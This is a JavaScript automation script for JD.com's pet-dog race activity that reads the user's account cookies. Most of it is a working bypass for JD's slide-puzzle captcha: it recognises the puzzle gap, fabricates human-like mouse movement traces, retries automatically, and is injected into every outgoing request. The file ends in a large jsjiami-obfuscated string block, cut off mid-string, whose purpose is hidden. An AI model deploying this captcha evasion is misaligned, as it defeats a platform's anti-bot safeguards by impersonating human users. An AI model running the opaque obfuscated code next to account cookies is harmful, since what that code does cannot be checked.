/*
Last Modified time: 2021-6-6 21:22:37


===================Quantumult X=====================
[task_local]
# 宠汪汪邀请助力与赛跑助力
15 10 * * * jd_joy_run.js, tag=宠汪汪邀请助力与赛跑助力
*/

const $ = new Env('宠汪汪赛跑');
const https = require('https');
const http = require('http');
const stream = require('stream');
const zlib = require('zlib');
const vm = require('vm');
const PNG = require('png-js');
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : {};
let UA = require('./USER_AGENTS.js').USER_AGENT;
const validatorCount = process.env.JDJR_validator_Count ? process.env.JDJR_validator_Count : 100
let jdJoyRunToken = '';
/*
由于 canvas 依赖系统底层需要编译且预编译包在 github releases 上，改用另一个纯 js 解码图片。若想继续使用 canvas 可调用 runWithCanvas 。

添加 injectToRequest 用以快速修复需验证的请求。eg: $.get=injectToRequest($.get.bind($))
 */

Math.avg = function average() {
  var sum = 0;
  var len = this.length;
  for (var i = 0; i < len; i++) {
    sum += this[i];
  }
  return sum / len;
};

function sleep(timeout) {
  return new Promise((resolve) => setTimeout(resolve, timeout));
}

class PNGDecoder extends PNG {
  constructor(args) {
    super(args);
    this.pixels = [];
  }

  decodeToPixels() {
    return new Promise((resolve) => {
      this.decode((pixels) => {
        this.pixels = pixels;
        resolve();
      });
    });
  }

  getImageData(x, y, w, h) {
    const {pixels} = this;
    const len = w * h * 4;
    const startIndex = x * 4 + y * (w * 4);

    return {data: pixels.slice(startIndex, startIndex + len)};
  }
}

const PUZZLE_GAP = 8;
const PUZZLE_PAD = 10;

class PuzzleRecognizer {
  constructor(bg, patch, y) {
    // console.log(bg);
    const imgBg = new PNGDecoder(Buffer.from(bg, 'base64'));
    const imgPatch = new PNGDecoder(Buffer.from(patch, 'base64'));

    // console.log(imgBg);

    this.bg = imgBg;
    this.patch = imgPatch;
    this.rawBg = bg;
    this.rawPatch = patch;
    this.y = y;
    this.w = imgBg.width;
    this.h = imgBg.height;
  }

  async run() {
    await this.bg.decodeToPixels();
    await this.patch.decodeToPixels();

    return this.recognize();
  }

  recognize() {
    const {ctx, w: width, bg} = this;
    const {width: patchWidth, height: patchHeight} = this.patch;
    const posY = this.y + PUZZLE_PAD + ((patchHeight - PUZZLE_PAD) / 2) - (PUZZLE_GAP / 2);
    // const cData = ctx.getImageData(0, a.y + 10 + 20 - 4, 360, 8).data;
    const cData = bg.getImageData(0, posY, width, PUZZLE_GAP).data;
    const lumas = [];

    for (let x = 0; x < width; x++) {
      var sum = 0;

      // y xais
      for (let y = 0; y < PUZZLE_GAP; y++) {
        var idx = x * 4 + y * (width * 4);
        var r = cData[idx];
        var g = cData[idx + 1];
        var b = cData[idx + 2];
        var luma = 0.2126 * r + 0.7152 * g + 0.0722 * b;

        sum += luma;
      }

      lumas.push(sum / PUZZLE_GAP);
    }

    const n = 2; // minium macroscopic image width (px)
    const margin = patchWidth - PUZZLE_PAD;
    const diff = 20; // macroscopic brightness difference
    const radius = PUZZLE_PAD;
    for (let i = 0, len = lumas.length - 2 * 4; i < len; i++) {
      const left = (lumas[i] + lumas[i + 1]) / n;
      const right = (lumas[i + 2] + lumas[i + 3]) / n;
      const mi = margin + i;
      const mLeft = (lumas[mi] + lumas[mi + 1]) / n;
      const mRigth = (lumas[mi + 2] + lumas[mi + 3]) / n;

      if (left - right > diff && mLeft - mRigth < -diff) {
        const pieces = lumas.slice(i + 2, margin + i + 2);
        const median = pieces.sort((x1, x2) => x1 - x2)[20];
        const avg = Math.avg(pieces);

        // noise reducation
        if (median > left || median > mRigth) return;
        if (avg > 100) return;
        // console.table({left,right,mLeft,mRigth,median});
        // ctx.fillRect(i+n-radius, 0, 1, 360);
        // console.log(i+n-radius);
        return i + n - radius;
      }
    }

    // not found
    return -1;
  }

  runWithCanvas() {
    const {createCanvas, Image} = require('canvas');
    const canvas = createCanvas();
    const ctx = canvas.getContext('2d');
    const imgBg = new Image();
    const imgPatch = new Image();
    const prefix = 'data:image/png;base64,';

    imgBg.src = prefix + this.rawBg;
    imgPatch.src = prefix + this.rawPatch;
    const {naturalWidth: w, naturalHeight: h} = imgBg;
    canvas.width = w;
    canvas.height = h;
    ctx.clearRect(0, 0, w, h);
    ctx.drawImage(imgBg, 0, 0, w, h);

    const width = w;
    const {naturalWidth, naturalHeight} = imgPatch;
    const posY = this.y + PUZZLE_PAD + ((naturalHeight - PUZZLE_PAD) / 2) - (PUZZLE_GAP / 2);
    // const cData = ctx.getImageData(0, a.y + 10 + 20 - 4, 360, 8).data;
    const cData = ctx.getImageData(0, posY, width, PUZZLE_GAP).data;
    const lumas = [];

    for (let x = 0; x < width; x++) {
      var sum = 0;

      // y xais
      for (let y = 0; y < PUZZLE_GAP; y++) {
        var idx = x * 4 + y * (width * 4);
        var r = cData[idx];
        var g = cData[idx + 1];
        var b = cData[idx + 2];
        var luma = 0.2126 * r + 0.7152 * g + 0.0722 * b;

        sum += luma;
      }

      lumas.push(sum / PUZZLE_GAP);
    }

    const n = 2; // minium macroscopic image width (px)
    const margin = naturalWidth - PUZZLE_PAD;
    const diff = 20; // macroscopic brightness difference
    const radius = PUZZLE_PAD;
    for (let i = 0, len = lumas.length - 2 * 4; i < len; i++) {
      const left = (lumas[i] + lumas[i + 1]) / n;
      const right = (lumas[i + 2] + lumas[i + 3]) / n;
      const mi = margin + i;
      const mLeft = (lumas[mi] + lumas[mi + 1]) / n;
      const mRigth = (lumas[mi + 2] + lumas[mi + 3]) / n;

      if (left - right > diff && mLeft - mRigth < -diff) {
        const pieces = lumas.slice(i + 2, margin + i + 2);
        const median = pieces.sort((x1, x2) => x1 - x2)[20];
        const avg = Math.avg(pieces);

        // noise reducation
        if (median > left || median > mRigth) return;
        if (avg > 100) return;
        // console.table({left,right,mLeft,mRigth,median});
        // ctx.fillRect(i+n-radius, 0, 1, 360);
        // console.log(i+n-radius);
        return i + n - radius;
      }
    }

    // not found
    return -1;
  }
}

const DATA = {
  "appId": "17839d5db83",
  "product": "embed",
  "lang": "zh_CN",
};
const SERVER = 'iv.jd.com';

class JDJRValidator {
  constructor() {
    this.data = {};
    this.x = 0;
    this.t = Date.now();
    this.count = 0;
  }

  async run(scene = 'cww', eid='') {
    const tryRecognize = async () => {
      const x = await this.recognize(scene, eid);

      if (x > 0) {
        return x;
      }
      // retry
      return await tryRecognize();
    };
    const puzzleX = await tryRecognize();
    // console.log(puzzleX);
    const pos = new MousePosFaker(puzzleX).run();
    const d = getCoordinate(pos);

    // console.log(pos[pos.length-1][2] -Date.now());
    // await sleep(4500);
    await sleep(pos[pos.length - 1][2] - Date.now());
    this.count++;
    const result = await JDJRValidator.jsonp('/slide/s.html', {d, ...this.data}, scene);

    if (result.message === 'success') {
      // console.log(result);
      console.log('JDJR验证用时: %fs', (Date.now() - this.t) / 1000);
      return result;
    } else {
      console.log(`验证失败: ${this.count}/${validatorCount}`);
      // console.log(JSON.stringify(result));
      if(this.count >= validatorCount){
        console.log("JDJR验证次数已达上限，退出验证");
        return result;
      }else{
        await sleep(300);
        return await this.run(scene, eid);
      }
    }
  }

  async recognize(scene, eid) {
    const data = await JDJRValidator.jsonp('/slide/g.html', {e: eid}, scene);
    const {bg, patch, y} = data;
    // const uri = 'data:image/png;base64,';
    // const re = new PuzzleRecognizer(uri+bg, uri+patch, y);
    const re = new PuzzleRecognizer(bg, patch, y);
    // console.log(JSON.stringify(re))
    const puzzleX = await re.run();

    if (puzzleX > 0) {
      this.data = {
        c: data.challenge,
        w: re.w,
        e: eid,
        s: '',
        o: '',
      };
      this.x = puzzleX;
    }
    return puzzleX;
  }

  async report(n) {
    console.time('PuzzleRecognizer');
    let count = 0;

    for (let i = 0; i < n; i++) {
      const x = await this.recognize();

      if (x > 0) count++;
      if (i % 50 === 0) {
        // console.log('%f\%', (i / n) * 100);
      }
    }

    console.log('验证成功: %f\%', (count / n) * 100);
    console.clear()
    console.timeEnd('PuzzleRecognizer');
  }

  static jsonp(api, data = {}, scene) {
    return new Promise((resolve, reject) => {
      const fnId = `jsonp_${String(Math.random()).replace('.', '')}`;
      const extraData = {callback: fnId};
      const query = new URLSearchParams({...DATA,...{"scene": scene}, ...extraData, ...data}).toString();
      const url = `https://${SERVER}${api}?${query}`;
      const headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip,deflate,br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Host': "iv.jd.com",
        'Proxy-Connection': 'keep-alive',
        'Referer': 'https://h5.m.jd.com/',
        'User-Agent': UA,
      };

      const req = https.get(url, {headers}, (response) => {
        let res = response;
        if (res.headers['content-encoding'] === 'gzip') {
          const unzipStream = new stream.PassThrough();
          stream.pipeline(
            response,
            zlib.createGunzip(),
            unzipStream,
            reject,
          );
          res = unzipStream;
        }
        res.setEncoding('utf8');

        let rawData = '';

        res.on('data', (chunk) => rawData += chunk);
        res.on('end', () => {
          try {
            const ctx = {
              [fnId]: (data) => ctx.data = data,
              data: {},
            };

            vm.createContext(ctx);
            vm.runInContext(rawData, ctx);

            // console.log(ctx.data);
            res.resume();
            resolve(ctx.data);
          } catch (e) {
            reject(e);
          }
        });
      });

      req.on('error', reject);
      req.end();
    });
  }
}

function getCoordinate(c) {
  function string10to64(d) {
    var c = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-~".split("")
      , b = c.length
      , e = +d
      , a = [];
    do {
      mod = e % b;
      e = (e - mod) / b;
      a.unshift(c[mod])
    } while (e);
    return a.join("")
  }

  function prefixInteger(a, b) {
    return (Array(b).join(0) + a).slice(-b)
  }

  function pretreatment(d, c, b) {
    var e = string10to64(Math.abs(d));
    var a = "";
    if (!b) {
      a += (d > 0 ? "1" : "0")
    }
    a += prefixInteger(e, c);
    return a
  }

  var b = new Array();
  for (var e = 0; e < c.length; e++) {
    if (e == 0) {
      b.push(pretreatment(c[e][0] < 262143 ? c[e][0] : 262143, 3, true));
      b.push(pretreatment(c[e][1] < 16777215 ? c[e][1] : 16777215, 4, true));
      b.push(pretreatment(c[e][2] < 4398046511103 ? c[e][2] : 4398046511103, 7, true))
    } else {
      var a = c[e][0] - c[e - 1][0];
      var f = c[e][1] - c[e - 1][1];
      var d = c[e][2] - c[e - 1][2];
      b.push(pretreatment(a < 4095 ? a : 4095, 2, false));
      b.push(pretreatment(f < 4095 ? f : 4095, 2, false));
      b.push(pretreatment(d < 16777215 ? d : 16777215, 4, true))
    }
  }
  return b.join("")
}

const HZ = 20;

class MousePosFaker {
  constructor(puzzleX) {
    this.x = parseInt(Math.random() * 20 + 20, 10);
    this.y = parseInt(Math.random() * 80 + 80, 10);
    this.t = Date.now();
    this.pos = [[this.x, this.y, this.t]];
    this.minDuration = parseInt(1000 / HZ, 10);
    // this.puzzleX = puzzleX;
    this.puzzleX = puzzleX + parseInt(Math.random() * 2 - 1, 10);

    this.STEP = parseInt(Math.random() * 6 + 5, 10);
    this.DURATION = parseInt(Math.random() * 7 + 14, 10) * 100;
    // [9,1600] [10,1400]
    this.STEP = 9;
    // this.DURATION = 2000;
    // console.log(this.STEP, this.DURATION);
  }

  run() {
    const perX = this.puzzleX / this.STEP;
    const perDuration = this.DURATION / this.STEP;
    const firstPos = [this.x - parseInt(Math.random() * 6, 10), this.y + parseInt(Math.random() * 11, 10), this.t];

    this.pos.unshift(firstPos);
    this.stepPos(perX, perDuration);
    this.fixPos();

    const reactTime = parseInt(60 + Math.random() * 100, 10);
    const lastIdx = this.pos.length - 1;
    const lastPos = [this.pos[lastIdx][0], this.pos[lastIdx][1], this.pos[lastIdx][2] + reactTime];

    this.pos.push(lastPos);
    return this.pos;
  }

  stepPos(x, duration) {
    let n = 0;
    const sqrt2 = Math.sqrt(2);
    for (let i = 1; i <= this.STEP; i++) {
      n += 1 / i;
    }
    for (let i = 0; i < this.STEP; i++) {
      x = this.puzzleX / (n * (i + 1));
      const currX = parseInt((Math.random() * 30 - 15) + x, 10);
      const currY = parseInt(Math.random() * 7 - 3, 10);
      const currDuration = parseInt((Math.random() * 0.4 + 0.8) * duration, 10);

      this.moveToAndCollect({
        x: currX,
        y: currY,
        duration: currDuration,
      });
    }
  }

  fixPos() {
    const actualX = this.pos[this.pos.length - 1][0] - this.pos[1][0];
    const deviation = this.puzzleX - actualX;

    if (Math.abs(deviation) > 4) {
      this.moveToAndCollect({
        x: deviation,
        y: parseInt(Math.random() * 8 - 3, 10),
        duration: 250,
      });
    }
  }

  moveToAndCollect({x, y, duration}) {
    let movedX = 0;
    let movedY = 0;
    let movedT = 0;
    const times = duration / this.minDuration;
    let perX = x / times;
    let perY = y / times;
    let padDuration = 0;

    if (Math.abs(perX) < 1) {
      padDuration = duration / Math.abs(x) - this.minDuration;
      perX = 1;
      perY = y / Math.abs(x);
    }

    while (Math.abs(movedX) < Math.abs(x)) {
      const rDuration = parseInt(padDuration + Math.random() * 16 - 4, 10);

      movedX += perX + Math.random() * 2 - 1;
      movedY += perY;
      movedT += this.minDuration + rDuration;

      const currX = parseInt(this.x + movedX, 10);
      const currY = parseInt(this.y + movedY, 10);
      const currT = this.t + movedT;

      this.pos.push([currX, currY, currT]);
    }

    this.x += x;
    this.y += y;
    this.t += Math.max(duration, movedT);
  }
}

function injectToRequest(fn,scene = 'cww', ua = '') {
  if(ua) UA = ua
  return (opts, cb) => {
    fn(opts, async (err, resp, data) => {
      if (err) {
        console.error(JSON.stringify(err));
        return;
      }
      if (data.search('验证') > -1) {
        console.log('JDJR验证中......');
				let arr = opts.url.split("&")
				let eid = ''
				for(let i of arr){
					if(i.indexOf("eid=")>-1){
						eid = i.split("=") && i.split("=")[1] || ''
					}
				}
        const res = await new JDJRValidator().run(scene, eid);

        opts.url += `&validate=${res.validate}`;
        fn(opts, cb);
      } else {
        cb(err, resp, data);
      }
    });
  };
}

exports.injectToRequest = injectToRequest;
$.get = injectToRequest($.get.bind($));
$.post = injectToRequest($.post.bind($));
var _0xodo='jsjiami.com.v6',_0x59a1=[_0xodo,'w51dfXRiw5Q=','w6LDgk90NMKxwoQ=','wqhRwrxI','FsOxw4hsw4rDjB9Rw58=','JGgqDsO2','AMKdwovCj1fDlsKBwrYeLS7Dl8Ktw7k2w6wOw7I=','wq09CMKkw4HDhA==','w6LDnj8C','JMOIQMOxwqbDqcKO','ZUfCmgo=','wr9BwrtEw5l4w7o=','Kzs9FsK3VyTChDJRwqrDiMKkPsKIeMOOwo4=','w7/CocKbwrTDjcO5wr4=','w4g/GMKFLMKwUA==','FyocwrvCh1xlY8Kc','BMKSfMO4w6jClAY=','fEh5VF9zUsKFYg==','wqw5Fg==','NHcpDMOrw7o=','w5NLR39nw4Vf','w55KbHFpw4hhwpZLFcKcwr/Cgjw=','wrpyw5s9','cBNIFQnDq30=','wqcDwrDDjH0HwofDl8ODKMOfKcKbwq/Cjw==','w7hvYMOHakkQ','IcKDw7vDusOkwoPCinpeRMOwICtVKQ==','B2cwDQ==','w55KAURsw55HwrtMDsKtwpDCmzvCtA==','w7wOd8OXw7sfCA==','KcOJa8O/wqjDpMKwWSLCssOrw4s8YsOzTUM=','wrcBwrDDjg==','woDCqi5aThzCgQ==','44GH5o+I56W844G26K215YeX6I6Z5Y265Lm/5Lq86LaS5Y6f5Lqewp8BEhpGE8Oj55qp5o6l5L2z55WZRxZ9woc9Quebv+S6kuS7neetuOWLiOiOgeWOtQ==','w43DqWNZZw==','w4fCssOiwp7DuGAZwpsLw7TDnsOrwpNJC3DCiHJ8YMK2w7zDs8Oowq5XWsKiw67Dl8KSw73DgxPDnyDDnyTDnsOuGXTDqQ==','5pu15pedw61hODBM','CcKTV8Oyw6XCpy09MA1UCAwhwrY=','fT97NzE=','I2rDllDCqA==','IsO9w5MGw6Y=','w7XCgjk=','w6rDjFBU','w7XCt8KI','e1PChAc=','FVooJsOq','w40Twp3Dm38=','w6zDmUlBJsOow4PDmMObw5Z5RHDDssO4MDhDwrVAAhpzTsO/wrxcw5HClWJ+wpLDozzCmifDkRZvwql/wroE','5ouL5Y60wpvCv8OHw6jCse+/oA==','w57DoBUmIcO0woUmwqk=','JMOKw5YQw4w=','wo0TP8KPw6HDgyBTw54=','w7NFYCsT','wrfCvRB1aQ==','w7J5cw==','44Gn5o+t56aj44Cf6K6k5YSd6I6V5Y+F5pyc5a+F5p+c56S45a6P5rOb5rCgw61yf8OvQw==','worCvSFnRA==','wqECw6zDtGMA','YD3Cp8Ofw6bCnFU6','MnYw','KcK4UcODw5vCtSkEOwVOITcEwpjDlxJOJA==','J8KIwq4=','w7/DijgJHQ==','w45WWg==','E8OIw4I5w7Q=','wrIoCsKqw4E=','w5hLXXxyw5k=','WHMlCA==','Xei1g+i2l+WEr+e5m+S/g+iAq+S6iOS7ueWZmuWsruebrMOuwpUA6L6m6KC95YqG5Yutw4XnhavlkI7ku4LotZflj77lh7zpg7fku7DliJDkuKjnm7/lm4TlrZvkvYvnvpblkL7luJXlkYXpmqzmnanmiI7ljZHov5rooKXliYXli4pl5aaj6Z6C6Ia05ba+6Lam5Y2I5YWa6YCP5Lif5Ymgw7nor4jnv6Pnj7rloKrljpfphKzCqsKVAsOZcXdJQzXDjnBtTMO2VnHDoMKMw5N3wo/ku67Chw7CgW/Ct+WIpuW9reWQl+i2muWMmuWHtOmCo+S7vuWInww=','w78QwpXDpGE=','Jl3CksK2wps/','w4Y0CMKENcKLVw==','w7hWwrbCoiBfw4fCpcKDbMKEQsOTw7DDk8KD','w5TDrGlV','GcKJw5XCuV7DnA==','OgcawpjChg==','RAodwq0=','OEzCisK8wpA=','w7XCkCofwrA=','HnwnAMO+','RxNkKS4=','w47DgGUIwrcmasK2SsKQwpbClw==','w53Cs8O4wrzDri1Xw4YN','w6APwp4=','fzLCr8OTw7o=','f1bCpQ3ClyUC','D8OmbcOZwovDssKIWSI=','wqsbwqQ=','X8OewotUXHfCicK9Bz99AlvjgZTlvYTlp4Dpg7Tora/liZDlirvjgYLCi8ODwrkIA8KqSsKfwrnCgG7DhsOww4oD','wpkqw6bDnnA=','w6UOwp3DqG0=','w6AFwpfDqmHDmw==','w4/DvWlGIQ==','eVfChwXChCQ=','wq4awqfDg8OV','w5BHRgkh','w61zXhYh','w5/CvBo5wqk=','EcKEw5guw6nDtg==','w7p0QyQf','BnrDmXvCgMKMw5s=','w7XDjsOAasKKNcKYw6g=','wprCky5cw75+BcOuAMOMw5njg6PlvqPlpZjliIjlioLlpZLljZHotYDotYHjg7bDmStXw5LCq8KkSgcWecOj','w7VhTsORXw==','HlPDvWsr','S8OowpJ3wo7DmA==','CsKZbMO5w7E=','w5wqAMKIOQ==','FG3DulbCiQ==','KsKow6Yhw5Q=','RCwzwoVh','wrRLwqg=','6ZyV6La86LSY5pWT6ZW6w6Y=','w6sKccOAw78=','KBtBG8KJ','w7zCq8KBwrU=','w6vDqDkaHA==','w7DChSoMwqvCpGDDqMOzfMO3J0AZAm/CisOSdsK6ADLCvz8FworDqkxEwrXCv15yQMKGwrALwrQkwqs1w7rDtcKVw4tAwpDDusO+EsKda21VBiAlUsOxeMOdIT9ZZCxbw7IBwrvCjA==','U0hx','OMKTwrvDjMOgwovCmkNV','NSPCp8O0wqs=','CsK6w5A4Fg==','CcKwwrEwZQ==','BsKcw5fCt0nDkQ==','w4XDhFgSwqg=','PsKkwozDi8Oo','w4ArwqDDgUHDnMOXcXs=','HcKmwpsS','w77CgzcZwrbDuh/CrsO8bA==','cn7CsDTChw==','L8OCUw==','aeWGhuaPmOS8h8Kp','Zj3CucOFw6c=','w4PDm8KI6Kyr5rKQ5aWJ6LWQ','PCAfwqDCsVZE','VMO5wo55wpTDlw==','OXo3L8OH','P2E5H8Oi','EsOGRsOwwpc=','GFw5IcO3','w4YVwqHDuGc=','FMKIwqURXA==','EcKOw5E=','fWHCoQHCpg==','w7cEZMO2w6gZ','w4pZXAkhw5IYw4M3w6DDvH4=','w5pHRWpi','w4AUFsKlPA==','w6xwesOmQA==','wqbCnxPor4nmsa3lpZnot4U=','D8KYb8OZw7vCkg==','wrZ4XSkxC8K1S2U=','6YCM6K6X5YmQ5YiW57uG5pyv776m','wqDCncOzwpzCkQ==','w4dbUHhjw4JN','wqB+XS8tL8KzSXk=','G3MSHMOf','5Luv6YKt6KyJ5Ym25Ymj5omK5YuKw5fojqnlv5w=','56S/5Yu6wos=','X1nCh8KBMw==','JTzCgsOVwqVEdsK0Ew==','w7fCgMKfwrnDhw==','w7gAJMKKGg==','RcOqwppdwrI=','wqpRwqFyw517w7p4CA==','5LqI6LWH6Lad5YuP5Yu25ouc5YqaBeiMnuW/v+eLluezhw==','BUjDt1w2IkNhHQ==','VlFTTUI=','w7LDqsKzwq/Ctw==','w4M1Cw==','OF7CmQ==','DMKCw5sM','6K6J5YmW6Zi55oWV5Z60fsK5PRJC6L2w5YSr5qOK5L2n5peJ5Yel5a6tw6Llu4jorJ7pgpfovLboh7Lmn7/lj5bojLrlj7YHdlHCqcKLcw==','wqwrAQ==','wrFKwqtFw4A=','AcKMw5IM','wrjCuzxbVg==','dlPChwzCnzgzwrTCizgd','fhhKGBzDukMGMAtQ','HcOIw5gFw7RZwro1','w5dbM8KDwqs=','5p2y5a+U5py156WN5a+I5rO15rG2FCoMWcOz5aa95paF','w55KeXR/w6NLwopqFMKowqrChQ==','44Gu5oyZ56eF44Gm5p2N5a6Z5p2O56W7wqvCihzCksK15aSn5pWz772/6K+b6YWq5paI6I+15Y6e','D8Kpwo/DjsOc','5LiI5LqFWVJtwoR5wrblpofml48=','w4tDXhAmwo1lwokiw6TDr3QQP8KvwpQFFMKaOsOIMEfCpDdLBMOdwowfw5sjwpEvwrp4w5kUdSp3NcOm','AHHDsg==','QwQE','wrF+Ri0=','YUDCgA8=','N8OMU8OhwpY=','eDlkPiI=','D8KYbw==','KsODUMOwwr8=','w4ZL5byD5aW457mD5aSW5Y6iwoR/','CWXovqjoopzpga7or47lioblirw=','6IaX5bSQ6LaQ5Y6+776R6LWt6LyE','NFTDo18d','wr4Sw6HDsHIbwo0=','w69/f8O6Rg==','T8OowpBgwqXDllhBwoA=','w7Nlcw==','wrYjwrDDsMOu','w6fli53liZjovaHmirvogY7mrZ4+wqdPwrZJwrzChknDleaaneS/p+iHuuW3ugE=','IkkXIcOH','A0EwCcOr','5Ym55Ymn5aaw6LeK77+46K6+5aSU5Y2fw7M=','w69ASQ8n','w77DhCs=','SuWJkOWIosOa','w6ovwonDl1g=','JMOow7sAw4Q=','w67DpMKm','LWMGNsOB','DsKEw4Itw7zDqsKi','w4E7AcKE','YlgFJD4=','w57DoBUmOcO0wokqwqk=','w5TCugcwwpTDsSjCrsO8','OsOnw7Axw44=','w7M7SMOVw40=','S8Oiwps=','GcKQwrA8Tg==','DMOXw6A=','UUZ7Wg==','44Gu5oyZ56eF44Gm5LqE5LinJCjCsMKOHsKS5bSp5aSn5pWz','5Lio5Lqx6LSb5Y+G','wo7orZrph7DmloHnmK7lvofojZvljKHCs8ObbF4uw6zDrHVzD8KzTgEbfAXDtMK2XcOBwpNoP8K5w6g5wpFwwowea8KzX8K7DsKpJAfDgjc+w595dA==','wrJAwoNPw59lw7U=','O8KGwrvDlsOr','w4M/AsKGOcKs','wolHdgwLA8K3SHI=','6LS66LW15Yiu5Yut57mw5p+T','wpfCrihNSg==','w7DClDIMwofDsSQ=','w6srwpHDv3o=','w4zDvHZNUcKbccKnw4PDtA==','5omz5YmoAuiMq+W8nueIt+eziQ==','w7bDijgL','QHk7Bx/CqEtcw4Q=','GsKowosW','w6YXGMK2Bw==','dnXCpQ==','w5xaR2t1wos=','w64Zbw==','w6XDv054SQ==','KcKWw5bCu1TDnA==','w47DgMKYwpDChhcewoPDuQ==','AUoQwrFZwrHCqcKIaTZuwoJ7Yh84Uw/CnUB7CcOZGn0+IsKnwqEiwpl6AsKlw5TCh8OiwqbChCNew7gaJcOsVMOGw6fComDCncOGw7/CgcK8w79yGQ3CglvClsK2Z8O0Ykk=','w6rCszVZbsOCw5rCkDlvw7bDusOhw7LCncOrwpknPjRMXMOYa8ORwrLCusO5HAPCkW/CuQpEdMODHVpTwofCkcKQXMOVwqzCrsONwoRdP8KpwoTDoMOYwp/DmcKmw6vCpw==','w7zDhMOD','wqNpw4s5w4sxAg==','JihAEMKs','w7XCmh0Vwqk=','wrFgwoV1w7o=','I0zCksK2wpw7IcKe','YUomISA=','ZWXCpyzCnw==','wqttQiU=','w77DhMOT','w7HDv8KzwrXCvB8cwoDDrg==','w7TDjE9CMA==','w69/Z8OL','EcKOw5EMw6/DrA==','w68OcMOH','NSTCnMOCwpQ=','GBAXwpnCqw==','w7fDucKt','w5PDu8O96K+V5rKn5aWx6LeP','w4bCscOgwqzDig==','wofCqitWUg==','RixrPxw=','FcKVUsObw6s=','w5HDhMObScKMJQ==','a8OGwqVcwq7Dn0ZIwoI=','w5TCj8K2wpzDuMOiwrTCn8OV','wonCtMOzwp/DmDVDw4YKw7TCgsOtwogCTHTCmjN0asKQwrbDqMKwwr5rPsKZw6rDvMOIw4fDgxbCggLCvhXChMOc','ORNVB8KJ','PGbCi8Kawqg=','dELCmQ7CmS8NwqjChzsDKsOXGl5D','wrMhwpLDvMOe','DMOEw50Cw4o=','F8OFw6sfw4cucMK+','wqARwrc=','woodw6zDg3Q=','QCxONi0=','w6TDgScmJQ==','DcOLw6A=','wrPCk8Olwoo=','MBIZwrfCpg==','ZD3CpcO+w68=','6YOD6K2a5Yqd5YiO57iU5pyB77+1','wqtRwqxDw51/w6g=','L8Kiw7IoOQ==','wrBBwqNQw6djw7A=','PSsFwrnCmlx9QsOZw5dIwqg=','ejPCrA==','CcOoWsOewoY=','wrQAwrHDj8ODLFM+wqw=','w5rCmjIswr4=','DizCucOSwrE=','ejPCrMOzw7DCjw==','MkjCisK7wpkuNA==','wqIAw7fDslY=','UnnCiirCqA==','wplnHwTCpw==','JUzCjMKswp0=','wqljSA==','w7/DmCs=','eRdRFA==','6Ky25Yqn6Zup5oeM5Z6dw64kTsO6cui/m+WHpuahiuS9n+aXoOWHv+WuvBzlubPorKHpgovovqDohLnmnJ3ljYboj73ljKjDt8O3MFLCssO/','w7DClDIMwofDuDrCq8O+','5oOr55ip6LWv6LWE5Ymu5YiG5p+V5Lyq5ba+6IOT5bK/','wr5ewqJww40=','JsO3WMOWwrA=','5p6g5a6u5pym56W85a+/5rCG5rK2WXPDjcO1wpHlprTml64=','44GF5o+956eE44OO5p6d5a+45p2c56eHaiRYw5zDluWnsOaVlO+/oeiuhumEneaUouiNhuWNjQ==','w6DCgMOXwrTDpQ==','C8KNw5IMGQ==','CA3nuKfku5TpnprlkZfljIDnmb/kuqTovpDoob/ot6LotanliajliofDpw==','wr3CncOx','HsKLw5DCvQ==','XnMr','O+i0luWMhg==','fFzCjQfCiA==','P8OD5b625aai57q45aS35Y2/wqBh','wooQBcKWw6Q=','wq7CvSJ0Rw==','GsOIw4I7','LTBo','B1jDrVwyNkdBHBTCoGhbwpE=','wqAHwrLDtcO6','VmPCgsKeEA==','PAzClcOfwoE=','w5LDrcKywqrChg==','fhhKGBzDuk4FMgZOw7k=','w63Dg0tYIcK3wr7CksOOw5JqTg==','w6DDnsOacMKAN8KLw6nDhg==','5Lm/6LWX6Le+5Yup5YuE5om85YmDAeiOq+W8seeJh+exkQ==','w41WRwU=','5LiP5Lir6LSM5Y6X','w47DgHcEwrs=','5b+K5aeM6Lez6LaE5YiX5YuO5aSa5Y2+WQ==','wr1Wwr1Pw4pPw7RuCQ==','fQDDgcOAZg==','JzAQwrPCi0pc','eBRRNho=','M8KRwqfDiMOU','w7/DmMOT','w4HCp8O7wos=','L0vClcKLwr4=','HcKQwrnDt8Os','w67CgcKpwpHDtA==','I1jDlE7CiQ==','5baY57ig6K2c5aat5Y+2wpk=','wqLliKLliZrovJvmi4Togb3mrJHCgMOlPMO6OcK0RiDDj+aZmeS/kOiGm+W2ngE=','Yi4two90wqnDoMKLYw==','IcKDwpbDi8OiwqvCuUNvfMOIBj9UMA==','w6sKYMOYw78=','wobCtypdZw==','FH3Ct+isqOayuuWlq+i1sA==','w6rDrsKtwqzCjRce','C8KJw4nCvFTDmsKZwp0eLDbCkcKzw68Gw7I=','VTPCpMOdw6vCmA==','WXnCsC7CpCMHwrnCgA==','RcOWw53ColzDjsOWwoMTJTvDksK2w6kNwrIEw7PDqsKYZV7CucORwozCnsOKGgFGdMKSwowtYMKnQcO2wrhfI8Kld8Otw6INWsKpwrElwrHCkgFa','HEEUA8Ox','OcOsw6I=','KcKtw4YAw5o=','CMOcw543w7c=','NmrDllfCjA==','wo/Cuy5OXFI=','w6oxbcOiw70=','FcKWZMO1w63CgRM+','wpVXwqxRw7k=','KcKNwpAHeg==','HVPDuG8W','BGIvDMOlaQ==','FMKPw5Isw6XDkcKl','wrlRw43CvCLChMKFOSfDpx8wwqoPw4rDjA==','EcORw7Qe','wqg2AsKmw43Doy0=','H8Kuwo/DhMOi','U0J4WEJ+','w47DtnNT','KMO/ccOhwrc=','fTYEwqt9','QxYT','XH0hAw==','Pn/Cu8Krwog=','w6oSwpLDnWQ=','wqDCtTw=','E8ORw4Mbw7E=','wrzCk8OmwqrChik=','w6gfccOaw7QMAMOCXQ==','w7cEZA==','JC19JsKvezLCvz4=','w4vDmiI+AA==','fHgtDAU=','M3kyBg==','w4tSRhAKw5gh','w41aWyQH','FcKLwrwxbA==','V1zCnsKfJQ==','5oqU5YiyN+iOhuW/gueIheexgg==','wqMVwrfDhw==','EMKWw5g7BD3DlcOyXg==','VVHChcKR','eVHCusKdHg==','WVV/WlhyUsKOVH0=','wrIvEsKRw5s=','C8OAwrUpw4kgfcKEw7DDncOmw67Coz3Cvg==','w5VBcxE2','w756ZMOPYl4QSTQSL8Kpw719w6fCsw==','w6zDmUlBJsOo','w6ctLsKFKw==','w5n